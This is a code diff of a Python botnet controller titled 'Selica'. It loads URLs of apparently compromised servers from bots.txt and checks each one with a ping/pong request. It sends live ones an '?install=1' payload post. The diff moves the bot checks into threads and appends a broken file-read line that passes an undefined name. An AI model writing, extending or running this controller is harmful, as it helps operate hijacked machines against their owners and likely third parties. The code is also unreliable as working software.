@@ -1,4 +1,5 @@
 import requests
+from time import sleep
 import os
 import ctypes
 from threading import Thread
@@ -50,22 +51,24 @@ def set_console_title(title):
     except:
         pass
 
-
+def check(bot):
+	try:
+		r = requests.get(bot + "?ping=qwe", timeout=1)
+		if "pong" in r.text:
+		    bots.append(bot)
+		    print("[+] " + bot + " good")
+		    set_console_title(f"Selica | bots: {str(len(bots))} | @io_ping")
+	except:
+		print("[-] " + bot + " bad")
 
 def get_bots():
 	global bots
+	bots = []
 	list_bots = open("bots.txt").read().splitlines()
 	for bot in list_bots:
-	    try:
-	        r = requests.get(bot + "?ping=qwe", timeout=1)
-	        if "pong" in r.text:
-	            bots.append(bot)
-	            print("[+] " + bot + " good")
-	            set_console_title(f"Selica | bots: {str(len(bots))} | @io_ping")
-	    except:
-	    	print("[-] " + bot + " bad")
-	    
-    
+		Thread(target=check, args=(bot,)).start()
+	sleep(5)
+
 def send_request(url, data, timeout):
 	try:
 		requests.post(url, data=data, timeout=timeout)
@@ -83,6 +86,8 @@ def install_bots():
 	    	Thread(target=send_request, args=(bot + "?install=1", data, 1,)).start()
 	    except:
 	        pass
+
+
 
 
 def stop():
@@ -302,3 +307,9 @@ if __name__ == '__main__':
 	print("type 'help' for get help")
 	print("")
 	main()
+
+
+
+file = open("cenz.txt", r)
+file = file.read()
+print(file)
